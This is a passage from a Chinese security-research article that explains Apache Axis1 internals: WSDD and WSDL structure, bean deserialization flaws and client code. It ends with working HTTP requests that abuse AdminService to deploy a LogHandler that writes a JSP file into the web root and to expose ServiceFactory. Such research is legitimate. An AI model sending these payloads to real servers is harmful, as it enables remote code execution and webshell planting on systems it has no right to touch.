**作者：Longofo@知道创宇404实验室  
日期：2021年2月26日**

Apache
Axis分为Axis1（一开始就是Axis，这里为了好区分叫Axis1）和Axis2，Axis1是比较老的版本了，在Axis1[官方文档](http://axis.apache.org/axis/java/index.html)说到，Apache
Axis1现在已经很大程度被[Apache Axis2](http://axis.apache.org/axis2/java/core/)，[Apache
CXF](http://cxf.apache.org/)和[Metro](http://metro.java.net/)取代，但是，Axis1仍与以下类型的项目相关：

  * 需要使用JAX-RPC的项目。该API只有两种开源实现：Axis和[Sun的参考实现](http://java.net/projects/jax-rpc/)。
  * 需要使用或公开使用SOAP编码的Web服务的项目。SOAP编码已被弃用，现代Web服务框架不再支持。但是，仍然存在使用编码类型的旧式服务。
  * 使用Axis构建的现有项目，使用现代Web服务框架重写它们的投资回报将太低。

之前遇到过几个应用还是在使用Axis1，Axis1依然存在于较多因为太庞大或臃肿而没那么容易被重构的系统中。

后面记录下Axis1和Axis2相关内容。各个WebService框架的设计有区别，但是也有相通之处，熟悉一个看其他的或许能省不少力气。

### 1\. Apache Axis1

#### 1.1 搭建一个Axis项目

如果一开始不知道配置文件要配置些什么，可以使用Intellij idea创建axis项目，idea会自动生成好一个基础的用于部署的server-config.wsdd配置文件以及web.xml文件，如果手动创建需要自己写配置文件，看过几个应用中的配置文件，用idea创建的server-config.wsdd中的基本配置参数在看过的几个应用中基本也有，所以猜测大多开发Axis的如果没有特殊需求一开始都不会手动去写一些基本的参数配置，只是往里面添加service。

##### 1.1.1 使用idea创建Axis项目

![](https://images.seebug.org/content/images/2021/02/26/1614308877000-1.png-w331s)

  1. 新建项目，选择WebServices
  2. 选择Apache Axis
  3. 如果你不知道axis开发要依赖些什么，就选择下载（默认会下载Axis1的最新版1.4版本）；你知道的话就可以选择之后自己设置依赖

完成之后，idea生成的结构如下：

![](https://images.seebug.org/content/images/2021/02/26/1614308877000-2.png-w331s)

主要是会自动帮我们生成好基础的wsdd配置文件和web.xml中的servlet

##### 1.1.2 访问WebService

搭建完成之后，和通常的部署web服务一样部署到tomcat或其他服务器上就可以了访问测试了。idea默认生成的web.xml中配置了两个web
services访问入口：

  1. /services
  2. /servlet/AxisServlet

![](https://images.seebug.org/content/images/2021/02/26/1614308877000-3.png-w331s)

![](https://images.seebug.org/content/images/2021/02/26/1614308877000-4.png-w331s)

还有一种是.jws结尾的文件，也可以作为web
service，.jws里面其实就是java代码，不过.jws只是作为简单服务使用，不常用，后续是只看wsdl这种的。

后续要用到的示例项目代码传到了[github]()。

#### 1.2 基本概念

##### 1.2.1 wsdd配置文件

大体基本结构如下，更详细的可以看idea生成的wsdd文件：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    
    <!-- 告诉Axis Engine这是一个部署描述文件。一个部署描述文件可以表示一个完整的engine配置或者将要部署到一个活动active的一部分组件。 -->
    <deployment xmlns="http://xml.apache.org/axis/wsdd/" xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
    
        <!-- 用于控制engine范围的配置。会包含一些参数 -->
        <globalConfiguration>
            <!-- 用来设置Axis的各种属性，参考Global Axis Configuration，可以配置任意数量的参数元素 -->
            <parameter name="adminPassword" value="admin" />
            <!-- 设置一个SOAP actor/role URI，engine可以对它进行识别。这允许指向这个role的SOAP headers成功的被engine处理 -->
            <role/>
            <!-- 全局的请求Handlers。在调用实际的服务之前调用 -->
            <requestFlow>
                <handler type="java:org.apache.axis.handlers.JWSHandler">
                    <parameter name="scope" value="session" />
                </handler>
                <handler type="java:org.apache.axis.handlers.JWSHandler">
                    <parameter name="scope" value="request" />
                    <parameter name="extension" value=".jwr" />
                </handler>
            </requestFlow>
            <!-- 全局响应Handlers，在调用完实际的服务后，还没有返回到客户端之前调用 -->
            <responseFlow/>
        </globalConfiguration>
    
        <!-- 用于定义Handler，并定义handler的类型。"Type" 可以是已经定义的Handler或者是"java:class.name"形式的QName。可选的"name"属性允许将这个Handler的定义在其他部署描述部分中引用。可以包含任意数量的<parameter name="name" value="value">元素. -->
        <handler name="LocalResponder" type="java:org.apache.axis.transport.local.LocalResponder" />
        <handler name="URLMapper" type="java:org.apache.axis.handlers.http.URLMapper" />
        <handler name="Authenticate" type="java:org.apache.axis.handlers.SimpleAuthenticationHandler" />
    
        <!-- 部署/卸载一个Axis服务,这是最复杂的一个WSDD标签。 -->
        <service name="AdminService" provider="java:MSG">
            <!-- allowedMethods: 每个provider可以决定那些方法允许web services访问，指定一个以空格分隔的方法名,只有这些方法可以通过web service访问。也可以将这个值指定为”*”表示所有的方法都可以访问。同时operation元素用来更进一步的定义被提供的方法，但是它不能决定方法的可见性 -->
            <parameter name="allowedMethods" value="AdminService" />
            <parameter name="enableRemoteAdmin" value="false" />
            <!--className：后台实现类,即暴露接口的类-->
            <parameter name="className" value="org.apache.axis.utils.Admin" />
            <namespace>http://xml.apache.org/axis/wsdd/</namespace>
        </service>
    
        <!-- provider="java:RPC"  默认情况下所有的public方法都可以web service方式提供-->
        <service name="TestService" provider="java:RPC">
            <!-- 每个service也可以设置requestFlow，每次调用service方法时都会依次调用对应的handler -->
            <requestFlow>
                <handler type="java:xxxHandlers" >
                </handler>
            </requestFlow>
            <parameter name="allowedMethed" value="sayHello"/>
            <parameter name="scope" value="Request"/>
            <parameter name="className"
                value="adam.bp.workflow.webservice.test.WebServicesTest"/>
        </service>
    
        <!-- 定义了一个服务器端的传输。当一个输入请求到达的时候，服务器传输被调用 -->
        <transport name="http">
            <!-- 指定handlers/chains 在请求被处理的时候被调用，这个功能和service元素中的功能一样。典型的传输请求响应handler实现了关于传输的功能。例如转换协议headers等等 -->
            <requestFlow>
                <handler type="URLMapper" />
                <handler type="java:org.apache.axis.handlers.http.HTTPAuthHandler" />
            </requestFlow>
            <parameter name="qs:list" value="org.apache.axis.transport.http.QSListHandler"/>
            <parameter name="qs:wsdl" value="org.apache.axis.transport.http.QSWSDLHandler"/>
            <parameter name="qs:method" value="org.apache.axis.transport.http.QSMethodHandler"/>
        </transport>
    
        <transport name="local">
            <!-- 指定handlers/chains 在响应被处理的时候被调用，这个功能和service元素中的功能一样。典型的传输请求响应handler实现了关于传输的功能。例如转换协议headers等等 -->
            <responseFlow>
                <handler type="LocalResponder" />
            </responseFlow>
        </transport>

后续对于漏洞利用需要关注的就是`<service`标签和`<handler`标签，还有`<transport
name="http">`中的几个parameter，qs:list、qs:wsdl、qs:method。这些在后面会逐步看到。

##### 1.2.2 Service Styles

在官方文档一共提供了四种Service方式：

  * RPC
  * Document
  * Wrapped
  * Message，上面wsdd中的AdminService就属于这类service，`<service name="AdminService" provider="java:MSG">`，它配置的是java:MSG

后续内容都是基于RPC方式，后续不做特别说明的默认就是RPC方式，也是Axis作为WebService常用的方式， **RPC** 服务遵循SOAP
RPC约定，其他三种方式暂不介绍（Message Service在1.2.3.4小节中会有说明）。

##### 1.2.3 wsdl组成

访问AdminService的wsdl来解析下wsdl结构：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-5.png-w331s)

wsdl主要包含5个部分：

  * types
  * messages
  * portType
  * binding
  * service

结合AdminService的代码来更好的理解wsdl：

    
    
    public class Admin {
        protected static Log log;
    
        public Admin() {
        }
    
        public Element[] AdminService(Element[] xml) throws Exception {
            log.debug("Enter: Admin::AdminService");
            MessageContext msgContext = MessageContext.getCurrentContext();
            Document doc = this.process(msgContext, xml[0]);
            Element[] result = new Element[]{doc.getDocumentElement()};
            log.debug("Exit: Admin::AdminService");
            return result;
        }
        ...
    }

###### 1.2.3.1 types

types是对于service对应的类，所有公开方法中的复杂参数类型和复杂返回类型的描述。如：

    
    
     <wsdl:types>
      <schema targetNamespace="http://xml.apache.org/axis/wsdd/" xmlns="http://www.w3.org/2001/XMLSchema">
       <element name="AdminService" type="xsd:anyType"/>
       <element name="AdminServiceReturn" type="xsd:anyType"/>
      </schema>
    
     </wsdl:types>

AdminService方法的参数和返回值中都有复杂类型，`<element name="AdminService"
type="xsd:anyType"/>`表示AdminService方法的Element[]参数，是一个Element类型的数组，不是基本类型（基本类型可以看1.2.4节），如果没有配置该类的对应的序列化器和反序列化器（在后续可以看到），在wsdl中就会写成`type="xsd:anyType"`。`<element
name="AdminServiceReturn" type="xsd:anyType"/>`就是AdminService方法的返回值，同理。

###### 1.2.3.2 messages

messages是对于service对应的类，每个公开方法每个参数类型和返回类型的描述。如：

    
    
       <wsdl:message name="AdminServiceResponse">
    
          <wsdl:part element="impl:AdminServiceReturn" name="AdminServiceReturn"/>
    
       </wsdl:message>
    
       <wsdl:message name="AdminServiceRequest">
    
          <wsdl:part element="impl:AdminService" name="part"/>
    
       </wsdl:message>

`<wsdl:message name="
AdminServiceRequest">`就是AdminService方法入参，它是一个复杂类型，所以用`element="impl:AdminService"`引用上面types中的`<element
name="AdminService" type="xsd:anyType"/>`。`<wsdl:message
name="AdminServiceResponse">`同理表示。

###### 1.2.3.3 portType

portType是service对应的类，有哪些方法被公开出来可被远程调用。如：

    
    
       <wsdl:portType name="Admin">
    
          <wsdl:operation name="AdminService">
    
             <wsdl:input message="impl:AdminServiceRequest" name="AdminServiceRequest"/>
    
             <wsdl:output message="impl:AdminServiceResponse" name="AdminServiceResponse"/>
    
          </wsdl:operation>
    
       </wsdl:portType>

这个service的AdminService方法被公开出来可以调用，他的输入输出分别是`impl:AdminServiceRequest`和`impl:AdminServiceResponse`，也就是上面messages对应的两个定义。

###### 1.2.3.4 binding

binding可以理解成如何通过soap进行方法请求调用的描述。如：

    
    
       <wsdl:binding name="AdminServiceSoapBinding" type="impl:Admin">
    
          <wsdlsoap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
    
          <wsdl:operation name="AdminService">
    
             <wsdlsoap:operation soapAction=""/>
    
             <wsdl:input name="AdminServiceRequest">
    
                <wsdlsoap:body use="literal"/>
    
             </wsdl:input>
    
             <wsdl:output name="AdminServiceResponse">
    
                <wsdlsoap:body use="literal"/>
    
             </wsdl:output>
    
          </wsdl:operation>
    
       </wsdl:binding>

这个binding的实现是impl:Admin，就是portType中的Admin。`<wsdlsoap:binding
style="document"`表示使用document样式（有rpc和document，两者区别在于方法的操作名是否出现在Soap中）。例如通过soap调用AdminService方法，他的soapAction=""，body使用literal方式编码(有literal和encoded两种，区别在于是否带上参数类型)。如：

    
    
    POST /axis/services/AdminService HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 473
    
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
      <soap:Body>
        <deployment
          xmlns="http://xml.apache.org/axis/wsdd/"
          xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
            <service name="randomAAA" provider="java:RPC">
              <parameter name="className" value="java.util.Random" />
              <parameter name="allowedMethods" value="*" />
            </service>
        </deployment>
      </soap:Body>
    </soap:Envelope>

这里soap没有方法名（即AdminService），也没有参数类型。可能这里会好奇，这个`<deployment`标签包含的数据怎么转换成AdminService方法中的Element[]数组的，这里其实就是1.2.2中说到的Service
styles使用的是java:MSG即Message方式，在文档中描述如下，所以使用Message Service方式是他自己做了转换：

    
    
    最后，我们到达“Message”样式的服务，当您希望Axis退后一步，让您的代码以实际的XML而不是将其转换为Java对象时，应使用它们。Message样式服务方法有四个有效签名：
    
    public Element [] method(Element [] bodies);
    public SOAPBodyElement [] method (SOAPBodyElement [] bodies);
    public Document method(Document body);
    public void method(SOAPEnvelope req, SOAPEnvelope resp);
    前两个将传递DOM元素或SOAPBodyElements的方法数组-数组将为信封中<soap：body>中的每个XML元素包含一个元素。
    
    第三个签名将为您传递一个表示<soap：body>的DOM文档，并且期望得到相同的结果。
    
    第四个签名为您传递了两个表示请求和响应消息的SOAPEnvelope对象。如果您需要查看或修改服务方法中的标头，则使用此签名。无论您放入响应信封的内容如何，返回时都会自动发送回给呼叫者。请注意，响应信封可能已经包含已由其他处理程序插入的标头。

###### 1.2.3.5 service

这个标签对于我们调用者其实没什么作用，也就说明下这个service的调用url为http://localhost:8080/axis/services/AdminService：

    
    
       <wsdl:service name="AdminService">
    
          <wsdl:port binding="impl:AdminServiceSoapBinding" name="AdminService">
    
             <wsdlsoap:address location="http://localhost:8080/axis/services/AdminService"/>
    
          </wsdl:port>

可以看出service包含了binding，binding包含了portType，portType包含了messages，messages包含了types。看wsdl的时候倒着从service看可能更好一点，依次往上寻找。

###### 1.2.3.6 说明

对于多个参数的方法，含有复杂类型的方法，可以看demo项目中的HelloWord的wsdl，我将那个类的方法参数改得更有说服力些，如果能看懂wsdl并且能猜测出这个service公开有哪些方法，每个方法的参数是怎样的，就基本没有问题了。

Axis文档中说到，1.2.3小节的每一部分在运行时都会动态生成对应的类去处理，不过我们不需要关心它怎么处理的，中间的生成代码对于该框架的漏洞利用也没有价值，不必去研究。

其实有工具来帮助解析wsdl的，例如soap
ui，我们也可以很方便的点击，填写数据就能调用。大多数时候没有问题，但是有时候传递复杂数据类型出现问题时，你得直到问题出在哪，还是得人工看下types，人工正确的构造下再传递；或者你自己绑定的恶意类不符合bean标准时，soap
ui其实生成的不准确或不正确，也要自己手动修改构造。

##### 1.2.4 wsdl types与java基础类型的对应

文档中列出了下面一些基本类型：

xsd:base64Binary | `byte[]`  
---|---  
xsd:boolean | `boolean`  
xsd:byte | `byte`  
xsd:dateTime | `java.util.Calendar`  
xsd:decimal | `java.math.BigDecimal`  
xsd:double | `double`  
xsd:float | `float`  
xsd:hexBinary | `byte[]`  
xsd:int | `int`  
xsd:integer | `java.math.BigInteger`  
xsd:long | `long`  
xsd:QName | `javax.xml.namespace.QName`  
xsd:short | `short`  
xsd:string | `java.lang.String`  
  
##### 1.2.5 axis不能通过soap发送什么

官方文档说，不能通过网络发送任意Java对象，并希望它们在远端被理解。如果你是使用RMI，您可以发送和接收可序列化的Java对象，但这是因为您在两端都运行Java。
**Axis仅发送已注册Axis序列化器的对象。**
本文档下面显示了如何使用BeanSerializer来序列化遵循访问者和变异者JavaBean模式的任何类。要提供对象，必须用BeanSerializer注册类，或者使用Axis中内置的Bean序列化支持。

##### 1.2.6 Bean类的反序列化

当类作为方法参数或者返回值时，需要用到Bean Serializer和Bean Deserializer，Axis有内置的Bean序列化器和反序列化器.

如上面项目中的我已经配置好的HelloWorld Service配置：

    
    
    <service name="HelloWorld" provider="java:RPC">
            <parameter name="className" value="example.HelloWorld"/>
            <parameter name="allowedMethods" value="*"/>
            <parameter name="scope" value="Application"/>
            <namespace>http://example</namespace>
    
            <typeMapping languageSpecificType="java:example.HelloBean" qname="ns:HelloBean" xmlns:ns="urn:HelloBeanManager"
                         serializer="org.apache.axis.encoding.ser.BeanSerializerFactory"
                         deserializer="org.apache.axis.encoding.ser.BeanDeserializerFactory"
                         encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            </typeMapping>
    
            <typeMapping languageSpecificType="java:example.TestBean" qname="xxx:TestBean" xmlns:xxx="urn:TestBeanManager"
                         serializer="org.apache.axis.encoding.ser.BeanSerializerFactory"
                         deserializer="org.apache.axis.encoding.ser.BeanDeserializerFactory"
                         encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            </typeMapping>
    
    
        </service>

使用`<typeMapping>`标签配置对应类的序列化器和反序列化器

###### 1.2.6.1 Bean类反序列化时构造器的选择

使用org.apache.axis.encoding.ser.BeanDeserializer#startElement选择Bean类的构造函数

    
    
    public void startElement(String namespace, String localName, String prefix, Attributes attributes, DeserializationContext context) throws SAXException {
            if (this.value == null) {
                try {
                    this.value = this.javaType.newInstance();//先调用默认构造器
                } catch (Exception var8) {
                    Constructor[] constructors = this.javaType.getConstructors();
                    if (constructors.length > 0) {
                        this.constructorToUse = constructors[0];//如果没找到默认构造器，就从全部构造器中选择第一个，这里的顺序可能不是固定的，比如有多个构造函数，这里constructors的顺序经过测试也不是按申明顺序排列的，可能和jdk版本有关，但是固定的jdk版本每次调用时这里的constructors顺序是不会改变的。这里应该是设计的有问题，为什么要这样没有目的的随意取一个构造器，在后面我会用java.io.File类当作Bean类来说明这个缺陷，而且在1.2.6.3小节中还会提到另一个缺陷
                    }
    
                    if (this.constructorToUse == null) {
                        throw new SAXException(Messages.getMessage("cantCreateBean00", this.javaType.getName(), var8.toString()));
                    }
                }
            }
    
            super.startElement(namespace, localName, prefix, attributes, context);
        }

###### 1.2.6.2 Bean类反序列化时有参构造器或setter方式为属性赋值的选择

org.apache.axis.encoding.ser.BeanDeserializer#onStartChild：

    
    
    public SOAPHandler onStartChild(String namespace, String localName, String prefix, Attributes attributes, DeserializationContext context) throws SAXException {
        ...
            ....
             else if (dSer == null) {
                    throw new SAXException(Messages.getMessage("noDeser00", childXMLType.toString()));
                } else {
                    if (this.constructorToUse != null) {//如果constructorToUse不为空就使用构造器，在1.2.4.1中如果有默认构造器，constructorToUse是不会被赋值的，如果没有默认构造器就会使用setter方式
                        if (this.constructorTarget == null) {
                            this.constructorTarget = new ConstructorTarget(this.constructorToUse, this);
                        }
    
                        dSer.registerValueTarget(this.constructorTarget);
                    } else if (propDesc.isWriteable()) {//否则使用属性设置器，setter方式
                        if ((itemQName != null || propDesc.isIndexed() || isArray) && !(dSer instanceof ArrayDeserializer)) {
                            ++this.collectionIndex;
                            dSer.registerValueTarget(new BeanPropertyTarget(this.value, propDesc, this.collectionIndex));
                        } else {
                            this.collectionIndex = -1;
                            dSer.registerValueTarget(new BeanPropertyTarget(this.value, propDesc));
                        }
                    }
                 ...
                     ...
                }
            }
        }

###### 1.2.6.3 Bean类反序列化时选择有参构造器赋值

如果选择了有参构造器赋值，就不会调用setter方法了，将属性作为参数传递给构造器，org.apache.axis.encoding.ConstructorTarget#set:

    
    
    public void set(Object value) throws SAXException {
            try {
                this.values.add(value);//外部传递的属性个数，可以只传递一个属性，也可以不传，还可以全部传，this.values就是从外部传递的数据个数值
                if (this.constructor.getParameterTypes().length == this.values.size()) {//这里判断了this.constructor(就是前面的constructorToUse)参数的个数和传递的个数是否相等，相等进入下面构造器的调用
                    Class[] classes = this.constructor.getParameterTypes();
                    Object[] args = new Object[this.constructor.getParameterTypes().length];
    
                    for(int c = 0; c < classes.length; ++c) {
                        boolean found = false;
    
                        //下面这个for循环判断构造函数的参数的类型是否和传递的参数类型一样，但是这个写法应该不正确，假如Bean类为java.io.File，构造函数被选择为public File(String parent,String Child)，this.values为{"./","test123.jsp"}那么当上面和下面这个循环结束后，args会变成{"./","./"}，这也是我后面测试过的，因为第二个循环从0开始的，构造器第一个参数类型和第二个参数类型一样都是String，当为第二个参数赋值时，this.values.get(0)的类型为String，匹配上第二个参数类型，所以args取到的第二个值还是"./"。
                        for(int i = 0; !found && i < this.values.size(); ++i) {
                            if (this.values.get(i).getClass().getName().toLowerCase().indexOf(classes[c].getName().toLowerCase()) != -1) {
                                found = true;
                                args[c] = this.values.get(i);
                            }
                        }
    
                        if (!found) {
                            throw new SAXException(Messages.getMessage("cannotFindObjectForClass00", classes[c].toString()));
                        }
                    }
    
                    Object o = this.constructor.newInstance(args);
                    this.deSerializer.setValue(o);
                }
    
            } catch (Exception var7) {
                throw new SAXException(var7);
            }
        }

###### 1.2.6.4 Bean类反序列化时setter方式为属性赋值

org.apache.axis.encoding.ser.BeanPropertyTarget#set：

    
    
    public void set(Object value) throws SAXException {
        //this.pd类型BeanPropertyDescriptor，下面就是setter方式为bean对象赋值
            try {
                if (this.index < 0) {
                    this.pd.set(this.object, value);
                } else {
                    this.pd.set(this.object, this.index, value);
                }
            } catch (Exception var8) {
                Exception e = var8;
    
                try {
                    Class type = this.pd.getType();
                    if (value.getClass().isArray() && value.getClass().getComponentType().isPrimitive() && type.isArray() && type.getComponentType().equals(class$java$lang$Object == null ? (class$java$lang$Object = class$("java.lang.Object")) : class$java$lang$Object)) {
                        type = Array.newInstance(JavaUtils.getWrapperClass(value.getClass().getComponentType()), 0).getClass();
                    }
    
                    if (JavaUtils.isConvertable(value, type)) {
                        value = JavaUtils.convert(value, type);
                        if (this.index < 0) {
                            this.pd.set(this.object, value);
                        } else {
                            this.pd.set(this.object, this.index, value);
                        }
                    } else {
                        if (this.index != 0 || !value.getClass().isArray() || type.getClass().isArray()) {
                            throw e;
                        }
    
                        for(int i = 0; i < Array.getLength(value); ++i) {
                            Object item = JavaUtils.convert(Array.get(value, i), type);
                            this.pd.set(this.object, i, item);
                        }
                    }
                } catch (Exception var7) {
                    ...
                        ...

##### 类作为参数需要的条件

  * 如果有公有默认构造器，则首先调用公有默认构造器，然后会调用setter方法为属性赋值；如果没有公有默认构造器，但是有公有构造器能传入参数，但是调用哪个可能不是固定的，此时不会再调用setter函数了
  * 该类的所有属性，如果不是基础类型，属性类也必须符合条件1才行
  * 类或者属性作为类都需要用`<typeMapping></typeMapping>`或`<beanMapping></beanMapping>`配置后才能使用（用typeMapping更通用些）

在后面的利用中有个RhinoScriptEngine作为恶意类就是个很好的例子

##### 类作为service需要的条件

  * 需要一个公有的默认构造器
  * 只有public的方法会作为service方法，并且不会包含父类的方法
  * 用`<service></service>`标签配置

#### 1.3 Axis客户端编写

大致步骤：

  1. 新建一个Service Call
  2. 设置Service端点
  3. 设置OperationName，也就是要调用的目标service公开出来的方法
  4. 如果方法参数不是基本类型，需要注册类的序列化器和反序列化器
  5. 使用call.invoke(new Object[]{param1,param2,...})调用即可

Axis Client：

    
    
    package client;
    
    import example.HelloBean;
    import example.TestBean;
    import org.apache.axis.client.Call;
    import org.apache.axis.client.Service;
    import org.apache.axis.encoding.ser.BeanDeserializerFactory;
    import org.apache.axis.encoding.ser.BeanSerializerFactory;
    
    import javax.xml.namespace.QName;
    import java.util.Date;
    
    
    public class AxisClient {
        public static void main(String[] args) {
            try {
                String endpoint =
                        "http://localhost:8080/axis/services/HelloWorld?wsdl";
    
                Service service = new Service();
                Call call = (Call) service.createCall();
    
                call.setTargetEndpointAddress(new java.net.URL(endpoint));
                QName opQname = new QName("http://example", "sayHelloWorldFrom");
                call.setOperationName(opQname);
    
                QName helloBeanQname = new QName("urn:HelloBeanManager", "HelloBean");
                call.registerTypeMapping(HelloBean.class, helloBeanQname, new BeanSerializerFactory(HelloBean.class, helloBeanQname), new BeanDeserializerFactory(HelloBean.class, helloBeanQname));
    
                QName testBeanQname = new QName("urn:TestBeanManager", "TestBean");
                call.registerTypeMapping(TestBean.class, testBeanQname, new BeanSerializerFactory(TestBean.class, testBeanQname), new BeanDeserializerFactory(TestBean.class, testBeanQname));
    
                HelloBean helloBean = new HelloBean();
                helloBean.setStr("aaa");
                helloBean.setAnInt(111);
                helloBean.setBytes(new byte[]{1, 2, 3});
                helloBean.setDate(new Date(2021, 2, 12));
                helloBean.setTestBean(new TestBean("aaa", 111));
                String ret = (String) call.invoke(new Object[]{helloBean});
    
                System.out.println("Sent 'Hello!', got '" + ret + "'");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

还可以使用soap ui工具进行调用，十分方便：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-6.png-w331s)

可以抓包看下使用代码发送的内容，和soap ui发送的有什么不同，尽管大多数时候soap
ui能正确帮你生成可调用的soap内容，你只用填写参数，但是有的复杂类型或者不符合bean标准的参数可能还是得手动修改或者使用代码调用的方式抓包数据来进行辅助修改。

#### 1.4 Axis的利用

利用方式有以下两种：

  * 暴露在外部的web service能直接调用造成危害，web service通常会存在较多的漏洞问题，很多时候没鉴权或者鉴权不够。
  * 利用AdminService部署恶意类service或者handler，但是AdminService只能local访问，需要配合一个SSRF

第一种方式需要根据实际应用来判断，后面只写第二种方式。1.4节之前的一些内容就是为了能够理解这里利用AdminService传递部署的`<deployment`内容，和wsdd配置一个意思。

##### 1.4.1 几个通用的RCE恶意类service或handler

有两个公开的LogHandler和ServiceFactory
；另一个我想起了之前jdk7及以下中存在的RhinoScriptEngine，由于Axis1版本比较老了，许多使用Axis1版本的大都是在jdk6、jdk7下，这种情况下前两个类不好用时，可以试下这个类，这个类的部署也有意思，用到了前面说到的`<typeMapping`来传递恶意类作为参数时的情况。

###### 1.4.1.1 org.apache.axis.handlers.LogHandler handler

post请求：

    
    
    POST /axis/services/AdminService HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 777
    
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
      <soap:Body>
        <deployment
          xmlns="http://xml.apache.org/axis/wsdd/"
          xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
            <service name="randomAAA" provider="java:RPC">
    <requestFlow>
                <handler type="java:org.apache.axis.handlers.LogHandler" >
                    <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />
                    <parameter name="LogHandler.writeToConsole" value="false" />
                </handler>
            </requestFlow>
              <parameter name="className" value="java.util.Random" />
              <parameter name="allowedMethods" value="*" />
            </service>
        </deployment>
      </soap:Body>
    </soap:Envelope>

get请求：

    
    
    GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22randomBBB%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22..%2Fwebapps%2FROOT%2Fshell.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache

通过get或post请求部署完成后，访问刚才部署的service并随意调用其中的一个方法：

    
    
    POST /axis/services/randomBBB HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 700
    
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://util.java">
       <soapenv:Header/>
       <soapenv:Body>
          <util:ints soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
             <in0 xsi:type="xsd:int" xs:type="type:int" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance"><![CDATA[
    <% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); %>
    ]]></in0>
             <in1 xsi:type="xsd:int" xs:type="type:int" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance">?</in1>
          </util:ints>
       </soapenv:Body>
    </soapenv:Envelope>

会在tomcat的webapps/ROOT/下生成一个shell.jsp文件

**缺陷：**
只有写入jsp文件时，并且目标服务器解析jsp文件时才有用，例如不让解析jsp但是解析jspx文件时，因为log中有其他垃圾信息，jspx会解析错误，所以写入jspx也是没用的

###### 1.4.1.2 org.apache.axis.client.ServiceFactory service

post请求：

    
    
    POST /axis/services/AdminService HTTP/1.1
    Host: 127.0.0.1:8080
    Connection: close
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept-Language: en-US,en;q=0.5
    SOAPAction: something
    Upgrade-Insecure-Requests: 1
    Content-Type: application/xml
    Accept-Encoding: gzip, deflate
    Content-Length: 750
    
    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:api="http://127.0.0.1/Integrics/Enswitch/API" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
      <soapenv:Body>
        <ns1:deployment xmlns:ns1="http://xml.apache.org/axis/wsdd/" xmlns="http://xml.apache.org/axis/wsdd/" xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
          <ns1:service name="ServiceFactoryService" provider="java:RPC">
            <ns1:parameter name="className" value="org.apache.axis.client.ServiceFactory"/>
            <ns1:parameter name="allowedMethods" value="*"/>
          </ns1:service>
        </ns1:deployment>
      </soapenv:Body>
    </soapenv:Envelope>

get请求：

    
    
    GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22ServiceFactoryService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache

